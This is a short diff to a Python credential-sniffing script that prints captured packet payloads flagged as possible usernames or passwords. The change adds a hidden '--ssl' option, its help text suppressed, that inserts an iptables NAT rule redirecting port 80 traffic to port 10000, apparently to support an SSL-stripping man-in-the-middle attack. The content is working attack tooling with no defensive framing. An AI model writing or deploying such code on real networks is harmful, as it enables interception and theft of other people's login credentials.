@@ -7,6 +7,7 @@ import argparse
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on")
+    parser.add_argument("-ssl", "--ssl", dest="ssl", action="store_true", help=argparse.SUPPRESS)
     options = parser.parse_args()
     if not options.interface:
         # handle error
@@ -28,4 +29,6 @@ def process_sniffed_packet(packet):
                 print("\n\n[+] Possible Username or Password >> " + packet_load + "\n\n")
 
 options = get_arguments()
+if options.ssl:
+    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
 sniff(options.interface)
